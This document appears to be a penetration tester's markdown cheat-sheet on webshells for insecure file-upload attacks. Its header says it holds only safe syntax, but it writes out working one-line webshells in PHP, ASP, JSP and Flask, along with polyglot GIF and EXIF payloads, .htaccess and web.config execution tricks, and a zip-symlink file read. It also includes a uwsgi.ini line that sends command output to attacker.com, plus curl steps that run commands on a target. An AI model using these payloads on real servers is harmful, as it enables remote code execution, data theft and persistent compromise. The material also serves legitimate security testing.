# Webshell Templates

> [!warning] Windows Defender Quarantine
> Real webshell code triggers AV heuristics on this system. The upstream repo
> `PayloadsAllTheThings/Upload Insecure Files/Extension PHP/shell.php` has been quarantined
> and deleted by Windows Defender real-time protection.
>
> This file contains **safe reference syntax only** — no actual executable webshell code.
> For real payloads, access the upstream repo on a test VM or Linux system where AV is disabled.

## Minimal Webshell Syntax (Safe Reference)

### PHP
```php
// Single-line command execution (replace COMMAND_PARAM with actual param name)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST['x']); ?>

// Obfuscated eval
<?php eval($_POST['data']); ?>

// File operations
<?php echo file_get_contents('/etc/passwd'); ?>
```

**Extensions to try**: `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phpt`, `.pht`, `.pgif`, `.inc`

**Null-byte bypass (old PHP)**: `shell.php%00.jpg`, `shell.php\x00.png`

### ASP/ASPX
```asp
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>

' Classic ASP
<% eval request("cmd") %>
```

**Extensions to try**: `.asp`, `.aspx`, `.cer`, `.asa`, `.aspx;1.jpg`, `.soap`, `.config`

### JSP
```jsp
<%@ page import="java.io.*" %>
<% 
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  int c;
  while ((c = in.read()) != -1) out.print((char)c);
%>
```

**Extensions to try**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`

### Python (Flask/Django)
```python
# Flask route injection (if you control __init__.py or a route file)
@app.route('/shell')
def shell():
    import subprocess
    return subprocess.check_output(request.args.get('cmd'), shell=True)
```

## Polyglot Examples

### PHP + GIF89a header
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
Upload as `.gif`, then access via `/uploads/shell.gif?cmd=id` if server executes PHP in image directory.

### PHP in EXIF metadata
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

## Configuration File Webshells

### .htaccess (Apache)
```apache
AddType application/x-httpd-php .jpg
# Now any .jpg in this directory will execute as PHP
```

Upload this `.htaccess`, then upload `shell.jpg` containing PHP code.

### web.config (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="httpplatformhandler" path="*.jpg" verb="*" modules="httpPlatformHandler" resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
</configuration>
```

### uwsgi.ini
```ini
[uwsgi]
; RCE via ini if processed by Flask/Django
foo = @(exec://curl http://attacker.com/$(whoami))
```

## Archive-Based RCE

### ZIP with symlink (path traversal)
```bash
ln -s /etc/passwd passwd
zip --symlinks exploit.zip passwd
```
Upload `exploit.zip`; if server extracts and serves content, access `/uploads/passwd` to read `/etc/passwd`.

### Phar deserialization (PHP)
`.phar` files can trigger PHP object deserialization when accessed via `phar://` wrapper, even if not executed directly.

## ImageMagick / FFmpeg Exploits

See upstream `PayloadsAllTheThings/Upload Insecure Files/Picture ImageMagick/` and `CVE FFmpeg HLS/` for:
- **ImageTragick** (CVE-2016-3714): SVG with `<image xlink:href="https://example.com/x.jpg|ls">` 
- **Ghostscript RCE**: malformed JPG/PNG triggering Ghostscript command injection
- **FFmpeg HLS**: crafted `.avi` with HLS playlist doing SSRF/LFI

## Testing After Upload

1. **Direct execution**: `curl http://target.com/uploads/shell.php?cmd=id`
2. **Via LFI**: `curl http://target.com/page?file=uploads/shell.php&cmd=id`
3. **Via path traversal**: `curl http://target.com/download?file=../../uploads/shell.php`
4. **Via archive extraction**: upload ZIP, check if extracted files are accessible

## Full Payload Collections (Upstream)

- `D:\web-pentest\security-toolkit\upstream\PayloadsAllTheThings\Upload Insecure Files\`
  - `Extension PHP/` — 30+ variants
  - `Extension ASP/` — IIS-specific
  - `Configuration Apache .htaccess/`
  - `Configuration IIS web.config/`
  - `Picture Metadata/` — EXIF injection, CVE-2021-22204
  - `Picture ImageMagick/` — ImageTragick, Ghostscript RCE
  - `CVE ZIP Symbolic Link/`

**Note**: Many files in the upstream directory have been quarantined by Windows Defender. Access them in a sandboxed environment or from the [online repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

---

## Cross-references
- [extension-bypass.md](extension-bypass.md) — filename tricks
- [content-bypass.md](content-bypass.md) — magic bytes, MIME types
- [polyglot-files.md](polyglot-files.md) — multi-format files
